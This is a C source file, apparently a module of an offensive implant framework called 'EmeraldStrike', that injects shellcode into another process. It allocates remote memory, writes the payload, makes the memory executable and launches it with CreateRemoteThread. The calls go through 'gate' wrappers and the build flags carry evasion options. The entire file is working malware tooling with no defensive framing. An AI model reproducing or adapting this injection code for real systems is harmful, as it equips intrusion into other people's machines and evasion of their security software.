// EmeraldStrike - CreateRemoteThread injection technique
#include "evasion/injection.h"
#include "common.h"
#include "config.h"

#if INJECTION_TECHNIQUE == INJECT_CRT

HANDLE inject_crt(PINSTANCE inst, HANDLE hProcess, BYTE* shellcode, DWORD sc_len, DWORD* step) {
    DBG(inst, "[INJECT] VirtualAllocEx");
    if (step) *step = 21;
    LPVOID remote = gate_VirtualAllocEx(inst, hProcess, NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) { DBG(inst, "[INJECT] VirtualAllocEx FAILED"); return NULL; }

    DBG(inst, "[INJECT] WriteProcessMemory");
    if (step) *step = 22;
    SIZE_T written = 0;
    if (!gate_WriteProcessMemory(inst, hProcess, remote, shellcode, sc_len, &written)) {
        DBG(inst, "[INJECT] WriteProcessMemory FAILED");
    }

    DBG(inst, "[INJECT] VirtualProtectEx");
    if (step) *step = 23;
    DWORD old_protect = 0;
#if defined(INCLUDE_EVASION_SMARTINJECT) && !defined(EVASION_USERWX)
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READ, &old_protect);
#else
    gate_VirtualProtectEx(inst, hProcess, remote, sc_len, PAGE_EXECUTE_READWRITE, &old_protect);
#endif

    DBG(inst, "[INJECT] CreateRemoteThread");
    if (step) *step = 24;
    return gate_CreateRemoteThread(inst,
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);
}

#endif // INJECT_CRT
